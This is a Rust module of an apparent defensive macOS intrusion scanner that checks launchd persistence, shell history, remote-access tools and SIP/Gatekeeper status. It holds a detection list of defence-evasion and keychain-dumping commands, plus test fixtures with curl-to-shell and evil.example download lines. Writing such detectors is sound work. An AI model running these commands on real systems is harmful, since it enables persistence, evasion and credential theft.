//! macOS intrusion artifacts for the portable Mac scan.
//!
//! Fills the same `IntrusionScanResults` vectors the Windows scan fills, so
//! the UI and report don't change.  Every source here is readable without
//! root and without Full Disk Access, and nothing writes to the host:
//!
//! * **Persistence**: launchd plists in `/Library/LaunchAgents`,
//!   `/Library/LaunchDaemons`, `/Library/StartupItems` and each readable
//!   `~/Library/LaunchAgents`.  (`/System/Library/*` is Apple, sealed by SIP.)
//! * **Command history**: `~/.zsh_history`, `~/.bash_history`,
//!   `~/.zsh_sessions/*.history`.
//! * **Remote access**: remote-control apps, their launchd jobs,
//!   `~/.ssh/authorized_keys`, and whether Remote Login / Screen Sharing are
//!   enabled (`launchctl print-disabled system`).
//! * **Security settings**: SIP (`csrutil status`), Gatekeeper
//!   (`spctl --status`), application firewall (`socketfilterfw`).
//!
//! The parsers are pure and platform-neutral (tested on Windows); only
//! [`collect_into`] runs commands, and it exists only on macOS.

use super::intrusion::{
    is_suspicious_command, CommandHistoryItem, IntrusionScanResults, PersistenceItem,
    RemoteAccessIndicator, SecurityTamperingItem,
};
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

/// Commands kept per history file besides the suspicious ones (most recent).
const HISTORY_TAIL: usize = 100;

fn fmt_unix(secs: i64) -> Option<String> {
    chrono::DateTime::from_timestamp(secs, 0).map(|d| d.format("%Y-%m-%d %H:%M:%S").to_string())
}

fn mtime_string(p: &Path) -> Option<String> {
    let t = std::fs::metadata(p).ok()?.modified().ok()?;
    Some(chrono::DateTime::<chrono::Utc>::from(t).format("%Y-%m-%d %H:%M:%S").to_string())
}

// ───────────────────────── persistence (launchd) ─────────────────────────

/// The parts of a launchd job definition that matter for triage.
#[derive(Debug, Clone, PartialEq, Default)]
pub struct LaunchdJob {
    pub label: String,
    /// `Program`, or `ProgramArguments[0]`.
    pub program: String,
    pub arguments: Vec<String>,
    pub run_at_load: bool,
    pub keep_alive: bool,
}

impl LaunchdJob {
    pub fn command_line(&self) -> String {
        let mut parts = vec![self.program.clone()];
        parts.extend(self.arguments.iter().skip(1).cloned());
        parts.retain(|s| !s.is_empty());
        parts.join(" ")
    }
}

pub fn parse_launchd_plist(v: &plist::Value) -> Option<LaunchdJob> {
    let d = v.as_dictionary()?;
    let s = |k: &str| d.get(k).and_then(|v| v.as_string()).unwrap_or("").to_string();
    let arguments: Vec<String> = d
        .get("ProgramArguments")
        .and_then(|v| v.as_array())
        .map(|a| a.iter().filter_map(|x| x.as_string().map(str::to_string)).collect())
        .unwrap_or_default();
    let mut program = s("Program");
    if program.is_empty() {
        program = arguments.first().cloned().unwrap_or_default();
    }
    let truthy = |k: &str| match d.get(k) {
        Some(plist::Value::Boolean(b)) => *b,
        Some(plist::Value::Dictionary(_)) => true, // KeepAlive conditions
        _ => false,
    };
    Some(LaunchdJob {
        label: s("Label"),
        program,
        arguments,
        run_at_load: truthy("RunAtLoad"),
        keep_alive: truthy("KeepAlive"),
    })
}

const SCRIPT_INTERPRETERS: &[&str] = &[
    "sh", "bash", "zsh", "dash", "python", "python3", "perl", "ruby", "osascript", "curl", "nc",
];

/// Heuristic: job runs from a temp/shared/hidden location, or is an
/// interpreter fed an inline script, or its command line trips the shared
/// command heuristics.
pub fn launchd_job_suspicious(job: &LaunchdJob) -> bool {
    let program = job.program.to_lowercase();
    if program.is_empty() {
        return false;
    }
    let risky_dirs = ["/tmp/", "/private/tmp/", "/var/tmp/", "/private/var/tmp/", "/users/shared/"];
    if risky_dirs.iter().any(|d| program.starts_with(d)) {
        return true;
    }
    if Path::new(&job.program)
        .components()
        .any(|c| c.as_os_str().to_string_lossy().starts_with('.') && c.as_os_str() != "." && c.as_os_str() != "..")
    {
        return true;
    }
    let base = Path::new(&program)
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_default();
    let cmd = job.command_line();
    let lower = cmd.to_lowercase();
    if SCRIPT_INTERPRETERS.contains(&base.as_str())
        && (job.arguments.iter().any(|a| a == "-c" || a == "-e") || lower.contains("http"))
    {
        return true;
    }
    is_suspicious_command(&cmd) || mac_suspicious_command(&cmd)
}

/// (directory, persistence_type) pairs for one machine.
fn launchd_dirs(root: &Path, homes: &[(String, PathBuf)]) -> Vec<(PathBuf, String)> {
    let mut dirs = vec![
        (root.join("Library/LaunchAgents"), "Launch Agent (all users)".to_string()),
        (root.join("Library/LaunchDaemons"), "Launch Daemon".to_string()),
        (root.join("Library/StartupItems"), "Startup Item (legacy)".to_string()),
    ];
    for (name, home) in homes {
        dirs.push((home.join("Library/LaunchAgents"), format!("Launch Agent ({})", name)));
    }
    dirs
}

pub fn scan_persistence(root: &Path, homes: &[(String, PathBuf)]) -> Vec<PersistenceItem> {
    let mut items = Vec::new();
    for (dir, kind) in launchd_dirs(root, homes) {
        let Ok(rd) = std::fs::read_dir(&dir) else { continue };
        let mut entries: Vec<PathBuf> = rd.flatten().map(|e| e.path()).collect();
        entries.sort();
        for path in entries {
            if path.extension().map(|e| e != "plist").unwrap_or(true) {
                // StartupItems are directories; report them as-is.
                if kind.starts_with("Startup Item") && path.is_dir() {
                    items.push(PersistenceItem {
                        persistence_type: kind.clone(),
                        name: path.file_name().unwrap_or_default().to_string_lossy().to_string(),
                        target_path: path.to_string_lossy().to_string(),
                        location: dir.to_string_lossy().to_string(),
                        timestamp: mtime_string(&path),
                        suspicious: true, // deprecated since 10.10; anything here is unusual
                    });
                }
                continue;
            }
            let job = plist::Value::from_file(&path).ok().and_then(|v| parse_launchd_plist(&v));
            let (name, target, suspicious) = match &job {
                Some(j) => (
                    if j.label.is_empty() {
                        path.file_stem().unwrap_or_default().to_string_lossy().to_string()
                    } else {
                        j.label.clone()
                    },
                    j.command_line(),
                    launchd_job_suspicious(j),
                ),
                None => (
                    path.file_stem().unwrap_or_default().to_string_lossy().to_string(),
                    "(unreadable plist)".to_string(),
                    false,
                ),
            };
            items.push(PersistenceItem {
                persistence_type: kind.clone(),
                name,
                target_path: target,
                location: path.to_string_lossy().to_string(),
                timestamp: mtime_string(&path),
                suspicious,
            });
        }
    }
    items
}

// ───────────────────────── shell history ─────────────────────────

/// zsh stores non-ASCII bytes "metafied": 0x83 followed by (byte ^ 0x20).
pub fn zsh_unmetafy(raw: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(raw.len());
    let mut it = raw.iter();
    while let Some(&b) = it.next() {
        if b == 0x83 {
            if let Some(&n) = it.next() {
                out.push(n ^ 0x20);
            }
        } else {
            out.push(b);
        }
    }
    out
}

/// Parse shell history text into `(unix_time, command)`.  Handles zsh
/// EXTENDED_HISTORY (`: <start>:<elapsed>;<cmd>`), bash HISTTIMEFORMAT
/// (`#<epoch>` line before the command), backslash-continued multi-line
/// commands, and plain one-command-per-line files.
pub fn parse_shell_history(text: &str) -> Vec<(Option<i64>, String)> {
    let mut out: Vec<(Option<i64>, String)> = Vec::new();
    let mut pending: Option<(Option<i64>, String)> = None;
    let mut bash_ts: Option<i64> = None;
    for line in text.lines() {
        if let Some((_, cmd)) = pending.as_mut() {
            // continuation of a backslash-terminated command
            cmd.push('\n');
            cmd.push_str(line);
            if !line.ends_with('\\') {
                out.push(pending.take().unwrap());
            }
            continue;
        }
        if let Some(t) = line.strip_prefix('#').and_then(|r| r.trim().parse::<i64>().ok()) {
            bash_ts = Some(t);
            continue;
        }
        let (ts, cmd) = match parse_extended_line(line) {
            Some((t, c)) => (Some(t), c.to_string()),
            None => (bash_ts.take(), line.to_string()),
        };
        if cmd.trim().is_empty() || (ts.is_none() && line.starts_with('#')) {
            continue;
        }
        if cmd.ends_with('\\') {
            pending = Some((ts, cmd));
        } else {
            out.push((ts, cmd));
        }
    }
    if let Some(p) = pending {
        out.push(p);
    }
    out
}

fn parse_extended_line(line: &str) -> Option<(i64, &str)> {
    let rest = line.strip_prefix(": ")?;
    let (meta, cmd) = rest.split_once(';')?;
    let (start, _elapsed) = meta.split_once(':')?;
    Some((start.trim().parse().ok()?, cmd))
}

/// macOS-specific anti-forensics / defence-evasion commands.
pub fn mac_suspicious_command(cmd: &str) -> bool {
    let c = cmd.to_lowercase();
    const NEEDLES: &[&str] = &[
        "csrutil disable",
        "spctl --master-disable",
        "spctl --global-disable",
        "spctl --disable",
        "xattr -d com.apple.quarantine",
        "xattr -cr",
        "xattr -rc",
        "tccutil reset",
        "launchctl load",
        "launchctl bootstrap",
        "chflags hidden",
        "dscl . -create",
        "dscl . -append /groups/admin",
        "dseditgroup -o edit -a",
        "log erase",
        "rm -rf /var/log",
        "rm -p ",
        "srm ",
        "history -c",
        "history -p",
        "unset histfile",
        "histsize=0",
        "base64 -d",
        "base64 --decode",
        "osascript -e",
        "nc -l",
        "ncat ",
        "socat ",
        "| sh",
        "| bash",
        "| zsh",
        "chmod +x /tmp",
        "security dump-keychain",
        "security find-generic-password",
        "defaults write com.apple.loginwindow loginhook",
    ];
    NEEDLES.iter().any(|n| c.contains(n))
}

/// History files of one home: (shell label, path).
fn history_files(home: &Path) -> Vec<(String, PathBuf)> {
    let mut files = vec![
        ("zsh".to_string(), home.join(".zsh_history")),
        ("bash".to_string(), home.join(".bash_history")),
        ("sh".to_string(), home.join(".sh_history")),
    ];
    if let Ok(rd) = std::fs::read_dir(home.join(".zsh_sessions")) {
        let mut s: Vec<PathBuf> = rd
            .flatten()
            .map(|e| e.path())
            .filter(|p| p.extension().map(|e| e == "history").unwrap_or(false))
            .collect();
        s.sort();
        files.extend(s.into_iter().map(|p| ("zsh (session)".to_string(), p)));
    }
    files.retain(|(_, p)| p.is_file());
    files
}

pub fn scan_shell_history(homes: &[(String, PathBuf)]) -> Vec<CommandHistoryItem> {
    let mut items = Vec::new();
    for (user, home) in homes {
        for (shell, path) in history_files(home) {
            let Ok(raw) = std::fs::read(&path) else { continue };
            let text = String::from_utf8_lossy(&zsh_unmetafy(&raw)).into_owned();
            let cmds = parse_shell_history(&text);
            let fallback = mtime_string(&path).unwrap_or_default();
            let tail_from = cmds.len().saturating_sub(HISTORY_TAIL);
            for (i, (ts, cmd)) in cmds.iter().enumerate() {
                let suspicious = is_suspicious_command(cmd) || mac_suspicious_command(cmd);
                if i < tail_from && !suspicious {
                    continue;
                }
                items.push(CommandHistoryItem {
                    command_type: format!("{} ({})", shell, user),
                    command: cmd.clone(),
                    timestamp: ts.and_then(fmt_unix).unwrap_or_else(|| fallback.clone()),
                    source_path: path.to_string_lossy().to_string(),
                    suspicious,
                });
            }
        }
    }
    items
}

// ───────────────────────── remote access ─────────────────────────

/// (needle in lower-cased app/label name, display name, risk)
const REMOTE_TOOLS: &[(&str, &str, &str)] = &[
    ("teamviewer", "TeamViewer", "HIGH"),
    ("anydesk", "AnyDesk", "HIGH"),
    ("rustdesk", "RustDesk", "HIGH"),
    ("screenconnect", "ScreenConnect", "HIGH"),
    ("connectwise", "ConnectWise Control", "HIGH"),
    ("splashtop", "Splashtop", "HIGH"),
    ("logmein", "LogMeIn", "HIGH"),
    ("gotomypc", "GoToMyPC", "HIGH"),
    ("ammyy", "Ammyy Admin", "HIGH"),
    ("remotepc", "RemotePC", "HIGH"),
    ("zoho assist", "Zoho Assist", "HIGH"),
    ("beyondtrust", "BeyondTrust", "HIGH"),
    ("bomgar", "BeyondTrust (Bomgar)", "HIGH"),
    ("chromoting", "Chrome Remote Desktop", "HIGH"),
    ("chrome remote desktop", "Chrome Remote Desktop", "HIGH"),
    ("vnc", "VNC", "MEDIUM"),
    ("parsec", "Parsec", "MEDIUM"),
    ("jump desktop", "Jump Desktop", "MEDIUM"),
    ("ngrok", "ngrok", "HIGH"),
    ("tailscale", "Tailscale", "MEDIUM"),
    ("zerotier", "ZeroTier", "MEDIUM"),
    ("microsoft remote desktop", "Microsoft Remote Desktop", "LOW"),
];

pub fn match_remote_tool(name: &str) -> Option<(&'static str, &'static str)> {
    let n = name.to_lowercase();
    REMOTE_TOOLS
        .iter()
        .find(|(needle, _, _)| n.contains(needle))
        .map(|(_, display, risk)| (*display, *risk))
}

/// Count keys and collect comments from an `authorized_keys` file.
pub fn parse_authorized_keys(text: &str) -> (usize, Vec<String>) {
    let mut n = 0;
    let mut comments = Vec::new();
    for line in text.lines().map(str::trim) {
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        n += 1;
        // [options] keytype base64 [comment] — the comment follows the blob.
        let fields: Vec<&str> = line.split_whitespace().collect();
        if let Some(i) = fields.iter().position(|f| f.starts_with("ssh-") || f.starts_with("ecdsa-") || f.starts_with("sk-")) {
            if fields.len() > i + 2 {
                comments.push(fields[i + 2..].join(" "));
            }
        }
    }
    (n, comments)
}

/// `launchctl print-disabled system` → label ⇒ enabled.  Handles both the
/// modern `=> enabled|disabled` and the older `=> true|false` (true = disabled).
pub fn parse_launchctl_disabled(text: &str) -> BTreeMap<String, bool> {
    let mut m = BTreeMap::new();
    for line in text.lines() {
        let Some((lhs, rhs)) = line.split_once("=>") else { continue };
        let label = lhs.trim().trim_matches('"').to_string();
        let enabled = match rhs.trim().trim_end_matches(',') {
            "enabled" | "false" => true,
            "disabled" | "true" => false,
            _ => continue,
        };
        m.insert(label, enabled);
    }
    m
}

pub fn scan_remote_access(
    root: &Path,
    homes: &[(String, PathBuf)],
    launchctl_disabled: Option<&str>,
) -> Vec<RemoteAccessIndicator> {
    let mut out = Vec::new();
    let ind = |kind: &str, tool: &str, user: Option<&str>, details: String, risk: &str, ts: Option<String>| {
        RemoteAccessIndicator {
            indicator_type: kind.to_string(),
            tool_name: tool.to_string(),
            timestamp: ts,
            source_ip: None,
            username: user.map(str::to_string),
            details,
            risk_level: risk.to_string(),
        }
    };

    // Installed apps
    let mut app_dirs = vec![root.join("Applications"), root.join("Applications/Utilities")];
    app_dirs.extend(homes.iter().map(|(_, h)| h.join("Applications")));
    for dir in app_dirs {
        let Ok(rd) = std::fs::read_dir(&dir) else { continue };
        let mut apps: Vec<PathBuf> = rd
            .flatten()
            .map(|e| e.path())
            .filter(|p| p.extension().map(|e| e.eq_ignore_ascii_case("app")).unwrap_or(false))
            .collect();
        apps.sort();
        for app in apps {
            let name = app.file_stem().unwrap_or_default().to_string_lossy().to_string();
            if let Some((tool, risk)) = match_remote_tool(&name) {
                out.push(ind(
                    "remote_tool",
                    tool,
                    None,
                    format!("Remote access application installed: {}", app.display()),
                    risk,
                    mtime_string(&app),
                ));
            }
        }
    }

    // launchd jobs of remote tools = unattended access configured
    for (dir, kind) in launchd_dirs(root, homes) {
        let Ok(rd) = std::fs::read_dir(&dir) else { continue };
        let mut plists: Vec<PathBuf> = rd.flatten().map(|e| e.path()).collect();
        plists.sort();
        for p in plists {
            let stem = p.file_stem().unwrap_or_default().to_string_lossy().to_string();
            if let Some((tool, _)) = match_remote_tool(&stem) {
                out.push(ind(
                    "remote_service",
                    tool,
                    None,
                    format!("{} starts {} automatically: {}", kind, tool, p.display()),
                    "HIGH",
                    mtime_string(&p),
                ));
            }
        }
    }

    // SSH keys that allow inbound login
    for (user, home) in homes {
        let ak = home.join(".ssh/authorized_keys");
        if let Ok(text) = std::fs::read_to_string(&ak) {
            let (n, comments) = parse_authorized_keys(&text);
            if n > 0 {
                let mut details = format!("{} authorized SSH key(s) in {}", n, ak.display());
                if !comments.is_empty() {
                    details.push_str(&format!(" — {}", comments.join(", ")));
                }
                out.push(ind("ssh_authorized_keys", "SSH", Some(user.as_str()), details, "MEDIUM", mtime_string(&ak)));
            }
        }
    }

    // Built-in services
    if let Some(text) = launchctl_disabled {
        let m = parse_launchctl_disabled(text);
        if m.get("com.openssh.sshd") == Some(&true) {
            out.push(ind(
                "ssh_enabled",
                "Remote Login (SSH)",
                None,
                "Remote Login (sshd) is enabled".to_string(),
                "HIGH",
                None,
            ));
        }
        if m.get("com.apple.screensharing") == Some(&true) {
            out.push(ind(
                "screen_sharing_enabled",
                "Screen Sharing (VNC)",
                None,
                "Screen Sharing is enabled".to_string(),
                "HIGH",
                None,
            ));
        }
    }
    out
}

// ───────────────────────── security settings ─────────────────────────

fn tamper(kind: &str, component: &str, details: &str, risk: &str) -> SecurityTamperingItem {
    SecurityTamperingItem {
        tamper_type: kind.to_string(),
        component: component.to_string(),
        timestamp: None,
        details: details.to_string(),
        registry_key: None,
        risk_level: risk.to_string(),
    }
}

/// `csrutil status` output → finding when SIP is off or customised.
pub fn check_csrutil(text: &str) -> Option<SecurityTamperingItem> {
    let t = text.to_lowercase();
    if t.contains("status: disabled") {
        Some(tamper("sip_disabled", "System Integrity Protection", text.trim(), "CRITICAL"))
    } else if t.contains("custom configuration") || t.contains("status: unknown") {
        Some(tamper("sip_modified", "System Integrity Protection", text.trim(), "HIGH"))
    } else {
        None
    }
}

/// `spctl --status` output → finding when Gatekeeper is off.
pub fn check_spctl(text: &str) -> Option<SecurityTamperingItem> {
    text.to_lowercase()
        .contains("assessments disabled")
        .then(|| tamper("gatekeeper_disabled", "Gatekeeper", text.trim(), "HIGH"))
}

/// `socketfilterfw --getglobalstate` → note when the firewall is off.  macOS
/// ships with it off, so this is informational only.
pub fn check_firewall(text: &str) -> Option<SecurityTamperingItem> {
    let t = text.to_lowercase();
    (t.contains("disabled") || t.contains("state = 0")).then(|| {
        tamper(
            "firewall_disabled",
            "Application Firewall",
            &format!("{} (macOS default is off)", text.trim()),
            "LOW",
        )
    })
}

// ───────────────────────── entry points ─────────────────────────

/// File-based collection against an arbitrary root — the testable core of
/// [`collect_into`].
pub fn collect_from(
    root: &Path,
    users_root: &Path,
    results: &mut IntrusionScanResults,
    persistence: bool,
    history: bool,
    remote: bool,
    launchctl_disabled: Option<&str>,
) {
    let homes = crate::scanner::walker::mac_home_dirs(users_root);
    let cancelled = crate::scanner::hash_scan::is_scan_cancelled;
    if persistence && !cancelled() {
        results.persistence_items.extend(scan_persistence(root, &homes));
    }
    if history && !cancelled() {
        results.command_history.extend(scan_shell_history(&homes));
    }
    if remote && !cancelled() {
        results
            .remote_access_indicators
            .extend(scan_remote_access(root, &homes, launchctl_disabled));
    }
}

#[cfg(target_os = "macos")]
fn run(program: &str, args: &[&str]) -> Option<String> {
    let out = std::process::Command::new(program).args(args).output().ok()?;
    let mut s = String::from_utf8_lossy(&out.stdout).into_owned();
    s.push_str(&String::from_utf8_lossy(&out.stderr));
    Some(s)
}

/// Live macOS host: everything above plus the command-based checks.
#[cfg(target_os = "macos")]
pub fn collect_into(results: &mut IntrusionScanResults, options: &super::intrusion::IntrusionScanOptions) {
    eprintln!("[Intrusion Scan] macOS artifacts…");
    let launchctl = if options.scan_remote_access {
        run("/bin/launchctl", &["print-disabled", "system"])
    } else {
        None
    };
    collect_from(
        Path::new("/"),
        Path::new("/Users"),
        results,
        options.scan_persistence,
        options.scan_command_history,
        options.scan_remote_access,
        launchctl.as_deref(),
    );
    if options.scan_security_tampering && !crate::scanner::hash_scan::is_scan_cancelled() {
        let checks: [(&str, &[&str], fn(&str) -> Option<SecurityTamperingItem>); 3] = [
            ("/usr/bin/csrutil", &["status"], check_csrutil),
            ("/usr/sbin/spctl", &["--status"], check_spctl),
            ("/usr/libexec/ApplicationFirewall/socketfilterfw", &["--getglobalstate"], check_firewall),
        ];
        for (prog, args, check) in checks {
            if let Some(item) = run(prog, args).as_deref().and_then(check) {
                results.security_tool_tampering.push(item);
            }
        }
    }
    eprintln!(
        "[Intrusion Scan] macOS: {} persistence, {} history, {} remote, {} security",
        results.persistence_items.len(),
        results.command_history.len(),
        results.remote_access_indicators.len(),
        results.security_tool_tampering.len()
    );
}

#[cfg(test)]
mod tests {
    use super::*;

    fn fresh_dir(tag: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("scout_macintr_{}_{}", tag, uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    fn job_plist(label: &str, args: &[&str]) -> plist::Value {
        let mut d = plist::Dictionary::new();
        d.insert("Label".into(), plist::Value::String(label.into()));
        d.insert(
            "ProgramArguments".into(),
            plist::Value::Array(args.iter().map(|a| plist::Value::String(a.to_string())).collect()),
        );
        d.insert("RunAtLoad".into(), plist::Value::Boolean(true));
        plist::Value::Dictionary(d)
    }

    #[test]
    fn launchd_plist_program_falls_back_to_arguments() {
        let j = parse_launchd_plist(&job_plist("com.example.agent", &["/usr/local/bin/agent", "--quiet"])).unwrap();
        assert_eq!(j.label, "com.example.agent");
        assert_eq!(j.program, "/usr/local/bin/agent");
        assert_eq!(j.command_line(), "/usr/local/bin/agent --quiet");
        assert!(j.run_at_load);
        assert!(!j.keep_alive);
    }

    #[test]
    fn launchd_suspicion_heuristics() {
        let job = |args: &[&str]| parse_launchd_plist(&job_plist("x.y", args)).unwrap();
        assert!(!launchd_job_suspicious(&job(&["/Applications/Foo.app/Contents/MacOS/Foo"])));
        assert!(!launchd_job_suspicious(&job(&["/opt/homebrew/opt/postgresql/bin/postgres", "-D", "/opt/homebrew/var"])));
        assert!(launchd_job_suspicious(&job(&["/tmp/updater"])));
        assert!(launchd_job_suspicious(&job(&["/Users/Shared/.x/run"])));
        assert!(launchd_job_suspicious(&job(&["/Users/bob/.local/hidden/agent"])));
        assert!(launchd_job_suspicious(&job(&["/bin/bash", "-c", "echo hi"])));
        assert!(launchd_job_suspicious(&job(&["/usr/bin/osascript", "-e", "do shell script"])));
        assert!(launchd_job_suspicious(&job(&["/usr/bin/curl", "https://evil.example/p", "-o", "/tmp/p"])));
    }

    #[test]
    fn persistence_scan_reads_system_and_user_agents() {
        let root = fresh_dir("root");
        let users = root.join("Users");
        for d in ["Library/LaunchAgents", "Library/LaunchDaemons", "Users/alice/Library/LaunchAgents"] {
            std::fs::create_dir_all(root.join(d)).unwrap();
        }
        job_plist("com.good.helper", &["/Library/Good/helper"])
            .to_file_xml(root.join("Library/LaunchDaemons/com.good.helper.plist"))
            .unwrap();
        job_plist("com.bad.persist", &["/bin/zsh", "-c", "curl http://x | sh"])
            .to_file_binary(root.join("Users/alice/Library/LaunchAgents/com.bad.persist.plist"))
            .unwrap();
        std::fs::write(root.join("Library/LaunchAgents/broken.plist"), b"not a plist").unwrap();
        std::fs::write(root.join("Library/LaunchAgents/.DS_Store"), b"x").unwrap();

        let homes = crate::scanner::walker::mac_home_dirs(&users);
        let items = scan_persistence(&root, &homes);
        let got: Vec<(&str, &str, bool)> = items
            .iter()
            .map(|i| (i.persistence_type.as_str(), i.name.as_str(), i.suspicious))
            .collect();
        assert_eq!(
            got,
            vec![
                ("Launch Agent (all users)", "broken", false),
                ("Launch Daemon", "com.good.helper", false),
                ("Launch Agent (alice)", "com.bad.persist", true),
            ]
        );
        assert_eq!(items[0].target_path, "(unreadable plist)");
        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn zsh_extended_history_and_continuations() {
        let text = ": 1700000000:0;ls -la\n: 1700000010:2;echo one \\\ntwo\nplain bash line\n\n# comment\n#1700000020\nbash timed\n";
        let got = parse_shell_history(text);
        assert_eq!(
            got,
            vec![
                (Some(1_700_000_000), "ls -la".to_string()),
                (Some(1_700_000_010), "echo one \\\ntwo".to_string()),
                (None, "plain bash line".to_string()),
                (Some(1_700_000_020), "bash timed".to_string()),
            ]
        );
    }

    #[test]
    fn zsh_unmetafy_restores_utf8() {
        // "é" = C3 A9; zsh metafies bytes >= 0x83 that collide with its
        // tokens — emulate one metafied byte (0xA9 -> 0x83, 0x89).
        let raw = [b'c', b'a', b'f', 0xC3, 0x83, 0xA9 ^ 0x20];
        assert_eq!(String::from_utf8(zsh_unmetafy(&raw)).unwrap(), "café");
    }

    #[test]
    fn history_keeps_tail_plus_older_suspicious() {
        let root = fresh_dir("hist");
        let home = root.join("alice");
        std::fs::create_dir_all(home.join(".zsh_sessions")).unwrap();
        let mut zsh = String::from(": 1600000000:0;csrutil disable\n");
        for i in 0..150 {
            zsh.push_str(&format!(": {}:0;echo {}\n", 1_700_000_000 + i, i));
        }
        std::fs::write(home.join(".zsh_history"), zsh).unwrap();
        std::fs::write(home.join(".zsh_sessions/ABC.history"), "xattr -d com.apple.quarantine /tmp/a\n").unwrap();

        let items = scan_shell_history(&[("alice".to_string(), home.clone())]);
        let zsh_items: Vec<&CommandHistoryItem> = items.iter().filter(|i| i.command_type == "zsh (alice)").collect();
        assert_eq!(zsh_items.len(), HISTORY_TAIL + 1);
        assert_eq!(zsh_items[0].command, "csrutil disable");
        assert!(zsh_items[0].suspicious);
        assert_eq!(zsh_items[0].timestamp, "2020-09-13 12:26:40");
        assert_eq!(zsh_items.last().unwrap().command, "echo 149");
        let session: Vec<&CommandHistoryItem> =
            items.iter().filter(|i| i.command_type == "zsh (session) (alice)").collect();
        assert_eq!(session.len(), 1);
        assert!(session[0].suspicious);
        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn remote_tools_keys_and_services() {
        let root = fresh_dir("remote");
        std::fs::create_dir_all(root.join("Applications/TeamViewer.app")).unwrap();
        std::fs::create_dir_all(root.join("Applications/Safari.app")).unwrap();
        std::fs::create_dir_all(root.join("Library/LaunchAgents")).unwrap();
        std::fs::write(root.join("Library/LaunchAgents/org.chromium.chromoting.plist"), b"x").unwrap();
        let home = root.join("Users/bob");
        std::fs::create_dir_all(home.join(".ssh")).unwrap();
        std::fs::write(
            home.join(".ssh/authorized_keys"),
            "# c\nssh-ed25519 AAAAC3Nz bob@laptop\nfrom=\"10.0.0.1\" ssh-rsa AAAAB3 attacker key\n",
        )
        .unwrap();
        let launchctl = "disabled services = {\n\t\"com.openssh.sshd\" => enabled\n\t\"com.apple.screensharing\" => disabled\n}\n";

        let homes = crate::scanner::walker::mac_home_dirs(&root.join("Users"));
        let got = scan_remote_access(&root, &homes, Some(launchctl));
        let kinds: Vec<(&str, &str)> = got.iter().map(|i| (i.indicator_type.as_str(), i.tool_name.as_str())).collect();
        assert_eq!(
            kinds,
            vec![
                ("remote_tool", "TeamViewer"),
                ("remote_service", "Chrome Remote Desktop"),
                ("ssh_authorized_keys", "SSH"),
                ("ssh_enabled", "Remote Login (SSH)"),
            ]
        );
        assert!(got[2].details.contains("2 authorized SSH key(s)"));
        assert!(got[2].details.contains("bob@laptop, attacker key"));
        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn launchctl_disabled_both_syntaxes() {
        let m = parse_launchctl_disabled("\"a\" => true\n\"b\" => false\n\"c\" => enabled\n\"d\" => disabled\n");
        assert_eq!(m.get("a"), Some(&false));
        assert_eq!(m.get("b"), Some(&true));
        assert_eq!(m.get("c"), Some(&true));
        assert_eq!(m.get("d"), Some(&false));
    }

    #[test]
    fn security_setting_checks() {
        assert!(check_csrutil("System Integrity Protection status: enabled.").is_none());
        assert_eq!(check_csrutil("System Integrity Protection status: disabled.").unwrap().risk_level, "CRITICAL");
        assert_eq!(
            check_csrutil("System Integrity Protection status: unknown (Custom Configuration).").unwrap().tamper_type,
            "sip_modified"
        );
        assert!(check_spctl("assessments enabled").is_none());
        assert_eq!(check_spctl("assessments disabled").unwrap().tamper_type, "gatekeeper_disabled");
        assert!(check_firewall("Firewall is enabled. (State = 1)").is_none());
        assert_eq!(check_firewall("Firewall is disabled. (State = 0)").unwrap().risk_level, "LOW");
    }
}
